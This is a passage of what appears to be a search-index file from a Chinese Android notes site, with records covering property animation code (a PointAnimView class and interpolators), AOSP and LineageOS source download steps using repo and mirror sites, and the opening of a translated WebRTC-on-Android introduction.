animScale.setRepeatMode(ValueAnimator.REVERSE); animScale.setDuration(5000); animScale.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() { @Override public void onAnimationUpdate(ValueAnimator animation) { radius = (float) animation.getAnimatedValue(); } }); \u8fd9\u91cc\uff0c\u6211\u4eec\u4f7f\u7528ObjectAnimator \u5b9e\u73b0\u5bf9color \u5c5e\u6027\u7684\u503c\u6309\u7167ArgbEvaluator \u8fd9\u4e2a\u7c7b\u7684\u89c4\u5f8b\u5728\u7ed9\u5b9a\u7684\u989c\u8272\u503c\u4e4b\u95f4\u53d8\u5316\uff0c\u8fd9\u4e2aArgbEvaluator \u548c\u6211\u4eec\u4e4b\u524d\u5b9a\u4e49\u7684PointSinEvaluator\u4e00\u6837\uff0c\u90fd\u662f\u51b3\u5b9a\u52a8\u753b\u5982\u4f55\u4ece\u521d\u59cb\u503c\u8fc7\u6e21\u5230\u7ed3\u675f\u503c\u7684\uff0c\u53ea\u4e0d\u8fc7\u8fd9\u4e2a\u7c7b\u662f\u7cfb\u7edf\u81ea\u5e26\u7684\uff0c\u6211\u4eec\u76f4\u63a5\u62ff\u6765\u7528\u5c31\u53ef\u4ee5\uff0c\u4ed6\u53ef\u4ee5\u5b9e\u73b0\u5404\u79cd\u989c\u8272\u95f4\u7684\u81ea\u7531\u8fc7\u6e21\u3002 \u5bf9radius \u8fd9\u4e2a\u5c5e\u6027\u4f7f\u7528\u4e86ValueAnimator\uff0c\u4f7f\u7528\u4e86\u5176ofFloat\u65b9\u6cd5\u5b9e\u73b0\u4e86\u4e00\u7cfb\u5217float\u503c\u7684\u53d8\u5316\uff1b\u540c\u65f6\u4e3a\u5176\u6dfb\u52a0\u4e86\u52a8\u753b\u53d8\u5316\u7684\u76d1\u542c\u5668\uff0c\u5728\u5c5e\u6027\u503c\u66f4\u65b0\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u53d8\u5316\u7684\u7ed3\u679c\u8d4b\u7ed9radius\uff0c\u8fd9\u6837\u5c31\u5b9e\u73b0\u4e86\u534a\u5f84\u52a8\u6001\u7684\u53d8\u5316\u3002 \u8fd9\u91ccradius \u4e5f\u53ef\u4ee5\u4f7f\u7528\u548ccolor\u76f8\u540c\u7684\u65b9\u5f0f\uff0c\u53ea\u9700\u8981\u628aArgbEvaluator \u66ff\u6362\u4e3aFloatEvaluator\uff0c\u540c\u65f6\u4fee\u6539\u52a8\u753b\u7684\u53d8\u5316\u503c\u5373\u53ef\uff1b\u4f7f\u7528\u6dfb\u52a0\u76d1\u542c\u5668\u7684\u65b9\u5f0f\uff0c\u53ea\u662f\u4e3a\u4e86\u4ecb\u7ecd\u76d1\u542c\u5668\u7684\u4f7f\u7528\u65b9\u6cd5\u800c\u5df2 \u597d\u4e86\uff0c\u5230\u8fd9\u91cc\u6211\u4eec\u5df2\u7ecf\u5b9a\u4e49\u51fa\u4e86\u6240\u6709\u9700\u8981\u7684\u52a8\u753b\uff0c\u524d\u9762\u8bf4\u8fc7\uff0c\u5c5e\u6027\u52a8\u753b\u4e5f\u662f\u53ef\u4ee5\u7ec4\u5408\u4f7f\u7528\u7684\u3002\u56e0\u6b64\uff0c\u5728\u52a8\u753b\u542f\u52a8\u7684\u65f6\u5019\uff0c\u540c\u65f6\u64ad\u653e\u8fd9\u4e09\u4e2a\u52a8\u753b\uff0c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u56fe\u4e2d\u7684\u6548\u679c\u4e86\u3002 animSet = new AnimatorSet(); animSet.play(valueAnimator).with(animColor).with(animScale); animSet.setDuration(5000); animSet.setInterpolator(interpolatorType); animSet.start(); PointAnimView \u6e90\u7801 public class PointAnimView extends View { public static final float RADIUS = 20f; private Point currentPoint; private Paint mPaint; private Paint linePaint; private AnimatorSet animSet; private TimeInterpolator interpolatorType = new LinearInterpolator(); /** * \u5b9e\u73b0\u5173\u4e8ecolor \u7684\u5c5e\u6027\u52a8\u753b */ private int color; private float radius = RADIUS; public PointAnimView(Context context) { super(context); init(); } public PointAnimView(Context context, AttributeSet attrs) { super(context, attrs); init(); } public PointAnimView(Context context, AttributeSet attrs, int defStyleAttr) { super(context, attrs, defStyleAttr); init(); } public int getColor() { return color; } public void setColor(int color) { this.color = color; mPaint.setColor(this.color); } public float getRadius() { return radius; } public void setRadius(float radius) { this.radius = radius; } private void init() { mPaint = new Paint(Paint.ANTI_ALIAS_FLAG); mPaint.setColor(Color.TRANSPARENT); linePaint = new Paint(Paint.ANTI_ALIAS_FLAG); linePaint.setColor(Color.BLACK); linePaint.setStrokeWidth(5); } @Override protected void onDraw(Canvas canvas) { if (currentPoint == null) { currentPoint = new Point(RADIUS, RADIUS); drawCircle(canvas); // StartAnimation(); } else { drawCircle(canvas); } drawLine(canvas); } private void drawLine(Canvas canvas) { canvas.drawLine(10, getHeight() / 2, getWidth(), getHeight() / 2, linePaint); canvas.drawLine(10, getHeight() / 2 - 150, 10, getHeight() / 2 + 150, linePaint); canvas.drawPoint(currentPoint.getX(), currentPoint.getY(), linePaint); } public void StartAnimation() { Point startP = new Point(RADIUS, RADIUS); Point endP = new Point(getWidth() - RADIUS, getHeight() - RADIUS); final ValueAnimator valueAnimator = ValueAnimator.ofObject(new PointSinEvaluator(), startP, endP); valueAnimator.setRepeatCount(-1); valueAnimator.setRepeatMode(ValueAnimator.REVERSE); valueAnimator.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() { @Override public void onAnimationUpdate(ValueAnimator animation) { currentPoint = (Point) animation.getAnimatedValue(); postInvalidate(); } }); // ObjectAnimator animColor = ObjectAnimator.ofObject(this, \"color\", new ArgbEvaluator(), Color.GREEN, Color.YELLOW, Color.BLUE, Color.WHITE, Color.RED); animColor.setRepeatCount(-1); animColor.setRepeatMode(ValueAnimator.REVERSE); ValueAnimator animScale = ValueAnimator.ofFloat(20f, 80f, 60f, 10f, 35f,55f,10f); animScale.setRepeatCount(-1); animScale.setRepeatMode(ValueAnimator.REVERSE); animScale.setDuration(5000); animScale.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() { @Override public void onAnimationUpdate(ValueAnimator animation) { radius = (float) animation.getAnimatedValue(); } }); animSet = new AnimatorSet(); animSet.play(valueAnimator).with(animColor).with(animScale); animSet.setDuration(5000); animSet.setInterpolator(interpolatorType); animSet.start(); } private void drawCircle(Canvas canvas) { float x = currentPoint.getX(); float y = currentPoint.getY(); canvas.drawCircle(x, y, radius, mPaint); } public void setInterpolatorType(int type ) { switch (type) { case 1: interpolatorType = new BounceInterpolator(); break; case 2: interpolatorType = new AccelerateDecelerateInterpolator(); break; case 3: interpolatorType = new DecelerateInterpolator(); break; case 4: interpolatorType = new AnticipateInterpolator(); break; case 5: interpolatorType = new LinearInterpolator(); break; case 6: interpolatorType=new LinearOutSlowInInterpolator(); break; case 7: interpolatorType = new OvershootInterpolator(); default: interpolatorType = new LinearInterpolator(); break; } } @TargetApi(Build.VERSION_CODES.KITKAT) public void pauseAnimation() { if (animSet != null) { animSet.pause(); } } public void stopAnimation() { if (animSet != null) { animSet.cancel(); this.clearAnimation(); } } }","title":"\u989c\u8272\u53ca\u534a\u5f84\u52a8\u753b\u5b9e\u73b0"},{"location":"Android/Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93%20Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93/#timeinterpolator","text":"Interpolator\u7684\u6982\u5ff5\u5176\u5b9e\u6211\u4eec\u5e76\u4e0d\u964c\u751f\uff0c\u5728\u8865\u95f4\u52a8\u753b\u4e2d\u6211\u4eec\u5c31\u4f7f\u7528\u5230\u4e86\u3002\u4ed6\u5c31\u662f\u7528\u6765\u63a7\u5236\u52a8\u753b\u5feb\u6162\u8282\u594f\u7684\uff1b\u800c\u5728\u5c5e\u6027\u52a8\u753b\u4e2d\uff0cTimeInterpolator \u4e5f\u662f\u7c7b\u4f3c\u7684\u4f5c\u7528\uff1bTimeInterpolator \u7ee7\u627f\u81eaInterpolator\u3002\u6211\u4eec\u53ef\u4ee5\u7ee7\u627fTimerInterpolator \u4ee5\u81ea\u5df1\u7684\u65b9\u5f0f\u63a7\u5236\u52a8\u753b\u53d8\u5316\u7684\u8282\u594f\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528Android \u7cfb\u7edf\u63d0\u4f9b\u7684Interpolator\u3002 \u4e0b\u9762\u90fd\u662f\u7cfb\u7edf\u5e2e\u6211\u4eec\u5b9a\u4e49\u597d\u7684\u4e00\u4e9bInterpolator\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7setInterpolator \u8bbe\u7f6e\u4e0d\u540c\u7684Interpolator\u3002 \u7cfb\u7edf\u81ea\u5e26Interpolator \u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u7684Interpolator\u5c31\u51b3\u5b9a\u4e86 \u524d\u9762\u6211\u4eec\u63d0\u5230\u7684fraction\u3002\u53d8\u5316\u7684\u8282\u594f\u51b3\u5b9a\u4e86\u52a8\u753b\u6240\u6267\u884c\u7684\u767e\u5206\u6bd4\u3002\u4e0d\u5f97\u4e0d\u8bf4\uff0c\u8fd9\u4e48ValueAnimator\u7684\u8bbe\u8ba1\u7684\u786e\u662f\u5f88\u5de7\u5999\u3002","title":"TimeInterpolator \u4ecb\u7ecd"},{"location":"Android/Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93%20Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93/#xml_1","text":"\u8fd9\u91cc\u63d0\u4e00\u4e0b\uff0c\u5c5e\u6027\u52a8\u753b\u5f53\u7136\u4e5f\u53ef\u4ee5\u4f7f\u7528xml\u6587\u4ef6\u7684\u65b9\u5f0f\u5b9e\u73b0\uff0c\u4f46\u662f\u5c5e\u6027\u52a8\u753b\u7684\u5c5e\u6027\u503c\u4e00\u822c\u4f1a\u7275\u626f\u5230\u5bf9\u8c61\u5177\u4f53\u7684\u5c5e\u6027\uff0c\u66f4\u591a\u662f\u901a\u8fc7\u4ee3\u7801\u52a8\u6001\u83b7\u53d6\uff0c\u6240\u4ee5xml\u6587\u4ef6\u7684\u5b9e\u73b0\u4f1a\u6709\u4e9b\u4e0d\u65b9\u4fbf\u3002 <set android:ordering=\"sequentially\"> <set> <objectAnimator android:propertyName=\"x\" android:duration=\"500\" android:valueTo=\"400\" android:valueType=\"intType\"/> <objectAnimator android:propertyName=\"y\" android:duration=\"500\" android:valueTo=\"300\" android:valueType=\"intType\"/> </set> <objectAnimator android:propertyName=\"alpha\" android:duration=\"500\" android:valueTo=\"1f\"/> </set> \u4f7f\u7528\u65b9\u5f0f\uff1a AnimatorSet set = (AnimatorSet) AnimatorInflater.loadAnimator(myContext, R.anim.property_animator); set.setTarget(myObject); set.start(); xml \u6587\u4ef6\u4e2d\u7684\u6807\u7b7e\u4e5f\u548c\u5c5e\u6027\u52a8\u753b\u7684\u7c7b\u76f8\u5bf9\u5e94\u3002 ValueAnimator --- <animator> ObjectAnimator --- <objectAnimator> AnimatorSet --- <set> \u8fd9\u4e9b\u5c31\u662f\u5c5e\u6027\u52a8\u753b\u7684\u6838\u5fc3\u5185\u5bb9\u3002\u73b0\u5728\u4f7f\u7528\u5c5e\u6027\u52a8\u753b\u7684\u7279\u6027\u81ea\u5b9a\u4e49\u52a8\u753b\u5e94\u8be5\u4e0d\u662f\u96be\u4e8b\u4e86\u3002\u5176\u4f59\u6807\u7b7e\u7684\u542b\u4e49\uff0c\u7ed3\u5408\u4e4b\u524d\u7684\u5185\u5bb9\u5e94\u8be5\u4e0d\u96be\u7406\u89e3\u4e86\u3002","title":"XML \u5c5e\u6027\u52a8\u753b"},{"location":"Android/Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93%20Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93/#vs","text":"\u76f8\u8f83\u4e8e\u4f20\u7edf\u52a8\u753b\uff0c\u5c5e\u6027\u52a8\u753b\u6709\u5f88\u591a\u4f18\u52bf\u3002\u90a3\u662f\u5426\u610f\u5473\u7740\u5c5e\u6027\u52a8\u753b\u53ef\u4ee5\u5b8c\u5168\u66ff\u4ee3\u4f20\u7edf\u52a8\u753b\u5462\u3002\u5176\u5b9e\u4e0d\u7136\uff0c\u4e24\u79cd\u52a8\u753b\u90fd\u6709\u5404\u81ea\u7684\u4f18\u52bf\uff0c\u5c5e\u6027\u52a8\u753b\u5982\u6b64\u5f3a\u5927\uff0c\u4e5f\u4e0d\u662f\u6ca1\u6709\u7f3a\u70b9\u3002 \u8865\u95f4\u52a8\u753b\u70b9\u51fb\u4e8b\u4ef6 \u5c5e\u6027\u52a8\u753b\u70b9\u51fb\u4e8b\u4ef6 \u4ece\u4e0a\u9762\u4e24\u5e45\u56fe\u6bd4\u8f83\u53ef\u4ee5\u53d1\u73b0\uff0c\u8865\u95f4\u52a8\u753b\u4e2d\uff0c\u867d\u7136\u4f7f\u7528translate\u5c06\u56fe\u7247\u79fb\u52a8\u4e86\uff0c\u4f46\u662f\u70b9\u51fb\u539f\u6765\u7684\u4f4d\u7f6e\uff0c\u4f9d\u65e7\u53ef\u4ee5\u53d1\u751f\u70b9\u51fb\u4e8b\u4ef6\uff0c\u800c\u5c5e\u6027\u52a8\u753b\u5374\u4e0d\u662f\u3002\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\uff0c\u5c5e\u6027\u52a8\u753b\u624d\u662f\u771f\u6b63\u7684\u5b9e\u73b0\u4e86view\u7684\u79fb\u52a8\uff0c\u8865\u95f4\u52a8\u753b\u5bf9view\u7684\u79fb\u52a8\u66f4\u50cf\u662f\u5728\u4e0d\u540c\u5730\u65b9\u7ed8\u5236\u4e86\u4e00\u4e2a\u5f71\u5b50\uff0c\u5b9e\u9645\u7684\u5bf9\u8c61\u8fd8\u662f\u5904\u4e8e\u539f\u6765\u7684\u5730\u65b9\u3002 \u5f53\u6211\u4eec\u628a\u52a8\u753b\u7684repeatCount\u8bbe\u7f6e\u4e3a\u65e0\u9650\u5faa\u73af\u65f6\uff0c\u5982\u679c\u5728Activity\u9000\u51fa\u65f6\u6ca1\u6709\u53ca\u65f6\u5c06\u52a8\u753b\u505c\u6b62\uff0c\u5c5e\u6027\u52a8\u753b\u4f1a\u5bfc\u81f4Activity\u65e0\u6cd5\u91ca\u653e\u800c\u5bfc\u81f4\u5185\u5b58\u6cc4\u6f0f\uff0c\u800c\u8865\u95f4\u52a8\u753b\u5374\u6ca1\u6709\u95ee\u9898\u3002\u56e0\u6b64\uff0c\u4f7f\u7528\u5c5e\u6027\u52a8\u753b\u65f6\u5207\u8bb0\u5728Activity\u6267\u884c onStop \u65b9\u6cd5\u65f6\u987a\u4fbf\u5c06\u52a8\u753b\u505c\u6b62\u3002\uff08\u5bf9\u8fd9\u4e2a\u6000\u7591\u7684\u540c\u5b66\u53ef\u4ee5\u81ea\u5df1\u901a\u8fc7\u5728\u52a8\u753b\u7684Update \u56de\u8c03\u65b9\u6cd5\u6253\u5370\u65e5\u5fd7\u7684\u65b9\u5f0f\u8fdb\u884c\u9a8c\u8bc1\uff09\u3002 xml \u6587\u4ef6\u5b9e\u73b0\u7684\u8865\u95f4\u52a8\u753b\uff0c\u590d\u7528\u7387\u6781\u9ad8\u3002\u5728Activity\u5207\u6362\uff0c\u7a97\u53e3\u5f39\u51fa\u65f6\u7b49\u60c5\u666f\u4e2d\u6709\u7740\u5f88\u597d\u7684\u6548\u679c\u3002 \u4f7f\u7528\u5e27\u52a8\u753b\u65f6\u9700\u8981\u6ce8\u610f\uff0c\u4e0d\u8981\u4f7f\u7528\u8fc7\u591a\u7279\u522b\u5927\u7684\u56fe\uff0c\u5bb9\u6613\u5bfc\u81f4\u5185\u5b58\u4e0d\u8db3\u3002 \u597d\u4e86\uff0c\u5173\u4e8eAndroid \u52a8\u753b\u7684\u603b\u7ed3\u5c31\u5230\u8fd9\u91cc\u3002 \u6700\u540e \u6709\u5174\u8da3\u7684\u540c\u5b66\u53ef\u67e5\u770b github \u6e90\u7801 \u6b22\u8fcestar & fork \u539f\u6587\u94fe\u63a5\uff1a https://www.jianshu.com/p/420629118c10","title":"\u4f20\u7edf\u52a8\u753b VS \u5c5e\u6027\u52a8\u753b"},{"location":"Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/","text":"\u4e00\u3001\u73af\u5883\u914d\u7f6e Google\u5b98\u65b9\u6587\u6863\uff1a https://source.android.com/setup/build/downloading \u5b89\u88c5Repo\uff1a mkdir ~/bin PATH=~/bin:$PATH curl https://storage.googleapis.com/git-repo-downloads/repo > ~/bin/repo chmod a+x ~/bin/repo \u521d\u59cb\u5316repo\uff1a mkdir WORKING_DIRECTORY cd WORKING_DIRECTORY git config --global user.name \"Your Name\" git config --global user.email \"you@example.com\" \u4ece\u8fd9\u4e2a\u94fe\u63a5 https://source.android.com/setup/start/build-numbers#source-code-tags-and-builds \u83b7\u53d6\u4e00\u4e2a\u5206\u652f\u5730\u5740\uff0c\u4f7f\u7528 repo init \u8fdb\u884c\u521d\u59cb\u5316\u3002\u5f53\u524d\u6700\u65b0\u7684tag\u5206\u652f\u4e3a android-10.0.0_r20 \uff0c\u5982\u4e0b\u56fe\u3002\u6211\u4eec\u4e0b\u8f7d\u6b64\u5206\u652f: \u540c\u6b65android-10.0.0_r20\u4ee3\u7801\uff1a repo init --depth 1 -u https://android.googlesource.com/platform/manifest -b android-10.0.0_r20 repo sync -c -j4 \u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u5f00\u6e90\u8f6f\u4ef6\u955c\u50cf : https://mirrors.ustc.edu.cn/help/aosp.html \u5728~/.bashrc\u4e2d\u914d\u7f6erepo export REPO_URL='https://gerrit-googlesource.proxy.ustclug.org/git-repo' \u540c\u6b65android-security-10.0.0_r66\u4ee3\u7801\uff1a mkdir android10-security-release && cd android10-security-release repo init --depth 1 -u git://mirrors.ustc.edu.cn/aosp/platform/manifest -b android-security-10.0.0_r66 repo sync -c -j4 \u540c\u6b65android-12.1.0_r5\u4ee3\u7801\uff1a mkdir android-12.1.0 && cd android-12.1.0 repo init --depth 1 -u git://mirrors.ustc.edu.cn/aosp/platform/manifest -b android-12.1.0_r5 repo sync -c -j4 \u538b\u7f29\u5206\u4eab\uff1a tar --exclude=\".*\" --exclude=\"out\" -cvf android10-security-release.tar.gz android10-security-release tar --exclude=\".*\" --exclude=\"out\" -cvf android-12.1.0.tar.gz android-12.1.0 \u6e05\u534e\u6e90 :\u3000 https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/ \u540c\u6b65android-security-10.0.0_r66\u4ee3\u7801\uff1a mkdir android10-security-release && cd android10-security-release repo init --depth 1 -u https://mirrors.tuna.tsinghua.edu.cn/git/AOSP/platform/manifest -b android-security-10.0.0_r66 repo sync -c -j4 \u540c\u6b65android-12.1.0_r5\u4ee3\u7801\uff1a mkdir android-12.1.0 && cd android-12.1.0 repo init --depth 1 -u https://mirrors.tuna.tsinghua.edu.cn/git/AOSP/platform/manifest -b android-12.1.0_r5 repo sync -c -j4 \u4e8c\u3001\u4e0b\u8f7dLineageOS-17.1 \u53c2\u8003 https://wiki.lineageos.org/devices/bacon/build \uff1a mkdir Lineage-17.1/ cd Lineage-17.1/ repo init -u https://github.com/LineageOS/android.git -b lineage-17.1 repo sync -c -j8 \u539f\u6587\u94fe\u63a5\uff1a http://droid10.com/2019/12/30/1\u3001android10\u6e90\u7801\u4e0b\u8f7d/","title":"Android10\u6e90\u7801\u4e0b\u8f7d"},{"location":"Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/#_1","text":"","title":"\u4e00\u3001\u73af\u5883\u914d\u7f6e"},{"location":"Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/#google-httpssourceandroidcomsetupbuilddownloading","text":"\u5b89\u88c5Repo\uff1a mkdir ~/bin PATH=~/bin:$PATH curl https://storage.googleapis.com/git-repo-downloads/repo > ~/bin/repo chmod a+x ~/bin/repo \u521d\u59cb\u5316repo\uff1a mkdir WORKING_DIRECTORY cd WORKING_DIRECTORY git config --global user.name \"Your Name\" git config --global user.email \"you@example.com\" \u4ece\u8fd9\u4e2a\u94fe\u63a5 https://source.android.com/setup/start/build-numbers#source-code-tags-and-builds \u83b7\u53d6\u4e00\u4e2a\u5206\u652f\u5730\u5740\uff0c\u4f7f\u7528 repo init \u8fdb\u884c\u521d\u59cb\u5316\u3002\u5f53\u524d\u6700\u65b0\u7684tag\u5206\u652f\u4e3a android-10.0.0_r20 \uff0c\u5982\u4e0b\u56fe\u3002\u6211\u4eec\u4e0b\u8f7d\u6b64\u5206\u652f: \u540c\u6b65android-10.0.0_r20\u4ee3\u7801\uff1a repo init --depth 1 -u https://android.googlesource.com/platform/manifest -b android-10.0.0_r20 repo sync -c -j4","title":"Google\u5b98\u65b9\u6587\u6863\uff1a https://source.android.com/setup/build/downloading"},{"location":"Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/#httpsmirrorsustceducnhelpaosphtml","text":"\u5728~/.bashrc\u4e2d\u914d\u7f6erepo export REPO_URL='https://gerrit-googlesource.proxy.ustclug.org/git-repo' \u540c\u6b65android-security-10.0.0_r66\u4ee3\u7801\uff1a mkdir android10-security-release && cd android10-security-release repo init --depth 1 -u git://mirrors.ustc.edu.cn/aosp/platform/manifest -b android-security-10.0.0_r66 repo sync -c -j4 \u540c\u6b65android-12.1.0_r5\u4ee3\u7801\uff1a mkdir android-12.1.0 && cd android-12.1.0 repo init --depth 1 -u git://mirrors.ustc.edu.cn/aosp/platform/manifest -b android-12.1.0_r5 repo sync -c -j4 \u538b\u7f29\u5206\u4eab\uff1a tar --exclude=\".*\" --exclude=\"out\" -cvf android10-security-release.tar.gz android10-security-release tar --exclude=\".*\" --exclude=\"out\" -cvf android-12.1.0.tar.gz android-12.1.0","title":"\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u5f00\u6e90\u8f6f\u4ef6\u955c\u50cf : https://mirrors.ustc.edu.cn/help/aosp.html"},{"location":"Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/#httpsmirrorstunatsinghuaeducnhelpaosp","text":"\u540c\u6b65android-security-10.0.0_r66\u4ee3\u7801\uff1a mkdir android10-security-release && cd android10-security-release repo init --depth 1 -u https://mirrors.tuna.tsinghua.edu.cn/git/AOSP/platform/manifest -b android-security-10.0.0_r66 repo sync -c -j4 \u540c\u6b65android-12.1.0_r5\u4ee3\u7801\uff1a mkdir android-12.1.0 && cd android-12.1.0 repo init --depth 1 -u https://mirrors.tuna.tsinghua.edu.cn/git/AOSP/platform/manifest -b android-12.1.0_r5 repo sync -c -j4","title":"\u6e05\u534e\u6e90 :\u3000https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/"},{"location":"Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/#lineageos-171","text":"\u53c2\u8003 https://wiki.lineageos.org/devices/bacon/build \uff1a mkdir Lineage-17.1/ cd Lineage-17.1/ repo init -u https://github.com/LineageOS/android.git -b lineage-17.1 repo sync -c -j8 \u539f\u6587\u94fe\u63a5\uff1a http://droid10.com/2019/12/30/1\u3001android10\u6e90\u7801\u4e0b\u8f7d/","title":"\u4e8c\u3001\u4e0b\u8f7dLineageOS-17.1"},{"location":"Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/","text":"\u539f\u6587 https://tech.appear.in/2015/05/25/Introduction-to-WebRTC-on-Android/ \u7ffb\u8bd1 WebRTC\u88ab\u79f0\u4e3a\u5f00\u6e90\u7f51\u7edc\u53d1\u5c55\u7684\u53c8\u4e00\u5927\u91cc\u7a0b\u7891\uff0c\u88ab\u770b\u4f5c\u4e3a\u8fd1\u4e9b\u5e74\u5bf9Web\u6807\u51c6\u7684\u6700\u91cd\u8981\u7684\u521b\u65b0\u3002WebRTC\u5141\u8bb8\u5f00\u53d1\u8005\u5728\u7f51\u9875\u5e94\u7528\u4e2d\u6dfb\u52a0\u97f3\u89c6\u9891\uff0c\u5e76\u4e14\u6298\u4e0d\u9700\u8981\u590d\u6742\u7684\u4ee3\u7801\u548c\u6602\u8d35\u7684\u5176\u4ed6\u7684\u57fa\u7840\u8bbe\u5907\u3002\u73b0\u5728\u6709Chrome\u3001Firfox\u548cOpera\u90fd\u5df2\u7ecf\u652f\u6301\u4e86WebRTC\uff0c\u5e76\u5c06\u6709\u66f4\u591a\u7684\u6d4f\u89c8\u5668\u4e5f\u5c06\u4f1a\u652f\u6301\uff0c\u6570\u5341\u4ebf\u7684\u8bbe\u5907\u5df2\u7ecf\u652f\u6301\u4e86\u3002 \u7136\u800c\uff0cWebRTC\u4e5f\u88ab\u79f0\u4e3a\u57ce\u5e02\u795e\u8bdd(\u5f88\u591a\u4eba\u90fd\u76f8\u4fe1\u4f46\u5b9e\u9645\u4e0a\u5e76\u4e0d\u771f\u5b9e\u7684\u6545\u4e8b)\uff1aWebRTC\u4ec5\u4ec5\u53ef\u4ee5\u5e94\u7528\u5728\u6d4f\u89c8\u5668\u4e0a\u3002\u4e8b\u5b9e\u4e0a\uff0cWebRTC\u6700\u91cd\u8981\u7684\u4e00\u4e2a\u7279\u5f81\u662f\u5b83\u5141\u8bb8nativ\u548cweb app\u4e4b\u95f4\u7684\u4e92\u64cd\u4f5c(\u8de8\u5e73\u53f0)\u7684\u3002\u5f88\u5c11\u6709\u4eba\u5229\u7528\u8fd9\u4e00\u4e2a\u7279\u5f81\u4f18\u52bf\u3002 \u8fd9\u7bc7Blog\u5c06\u4ecb\u7ecd\u7ed9\u4f60\u5982\u4f55\u5728\u4f60\u7684Android\u5e94\u7528\u4e2d\u96c6\u6210WebRTC\uff0c\u4f7f\u7528\u4e86WebRTC\u63d0\u4f9b\u7684\u672c\u5730\u5e93\uff0c\u63d0\u4f9b\u8005: WebRTC Initiative \u3002\u6211\u4eec\u4e0d\u4f1a\u5f3a\u8c03\u901a\u8fc7signalling\u5efa\u7acb\u8fde\u63a5\uff0c\u800c\u662f\u5f3a\u8c03Android\u548c\u6d4f\u89c8\u5668\u95f4\u7684\u76f8\u4f3c\u548c\u5dee\u5f02\u3002\u6b63\u5982\u4f60\u5c06\u770b\u5230\u7684\uff0c\u5c06\u5305\u542b\u4e00\u4e9b\u8fde\u63a5\u5230Web\u7684APIs\uff0c\u5982\u679c\u4f60\u60f3\u770b\u5230\u66f4\u591a\u7684\u57fa\u672c\u7684\u5173\u4e8eWebRTC\u7684\u4ecb\u7ecd\uff0c\u8bf7\u770b\uff1a Sam Dutton\u2019s Getting started with WebRTC \u3002 \u5728\u4f60\u7684\u9879\u76ee\u4e2d\u6dfb\u52a0WebRTC\u7684\u5e93 \u4ee5\u4e0b\u5185\u5bb9\u4f7f\u7528WebRTC\u5e93\u4e2d\u76849127\u7248\u672c\u3002 \u7b2c\u4e00\u4ef6\u4e8b\u662f\u6dfb\u52a0WebRTC\u5e93\u5230\u4f60\u7684\u9879\u76ee\u4e2d\u3002\u4f60\u53ef\u4ee5\u81ea\u5df1 \u7f16\u8bd1 \u8fd9\u4e2a\u5e93\uff0c\u4f46\u662f\u76f8\u4fe1\u6211\uff0c\u5982\u679c\u53ef\u4ee5\u7684\u8bdd\uff0c\u907f\u514d\u81ea\u5df1\u7f16\u8bd1\u3002\u76f8\u53cd\uff0c\u4f7f\u7528 \u4e2d\u592e\u5382\u5e93 \u4e2d\u5df2\u7ecf\u7f16\u8bd1\u597d\u7684\u6587\u4ef6\u3002 \u4e3a\u4e86\u5728\u4f60\u7684\u9879\u76ee\u4e2d\u6dfb\u52a0\u8fd9\u4e2a\u6587\u4ef6\uff0c\u9700\u8981\u8fd9\u6837\u5199\u4f9d\u8d56\uff1a compile 'io.pristine:libjingle:9127@aar' \u540c\u6b65\u4f60\u7684\u9879\u76ee\uff0c\u4f60\u5df2\u7ecf\u62e5\u6709\u4e86\u53ef\u4ee5\u4f7f\u7528\u7684\u5e93\u6587\u4ef6\u4e86\uff01 \u6743\u9650 \u5c31\u50cf\u6240\u6709\u7684Android\u4e00\u6837\uff0c\u4f7f\u7528\u8fd9\u4e2aAPI\u4f60\u9700\u8981\u58f0\u660e\u4e00\u4e9b\u6743\u9650\u3002WebRTC\u4e5f\u4e0d\u4f8b\u5916\u3002\u6839\u636e\u4f60\u73b0\u5728\u4f7f\u7528\u7684\u6216\u8005\u662f\u5c06\u6765\u4f1a\u4f7f\u7528\u7684\u6743\u9650\uff0c\u4f8b\u5982\u97f3\u9891\u548c\u89c6\u9891\uff0c\u4f60\u9700\u8981\u8bbe\u7f6e\u4e0d\u540c\u7684\u6743\u9650\u3002\u786e\u4fdd\u4f60\u53ea\u8bf7\u6c42\u4e00\u6b21\u3002\u4e00\u4e2a\u53ef\u7528\u7684\u89c6\u9891\u804a\u5929\u5e94\u7528\u7684\u6743\u9650\u8bbe\u7f6e\uff1a <uses-feature android:name=\"android.hardware.camera\" /> <uses-feature android:name=\"android.hardware.camera.autofocus\" /> <uses-feature android:glEsVersion=\"0x00020000\" android:required=\"true\" /> <uses-permission android:name=\"android.permission.CAMERA\" /> <uses-permission android:name=\"android.permission.RECORD_AUDIO\" /> <uses-permission android:name=\"android.permission.INTERNET\" /> <uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\" /> <uses-permission android:name=\"android.permission.MODIFY_AUDIO_SETTINGS\" /> \u706f\u5149\uff0c\u76f8\u673a\u2026\u2026 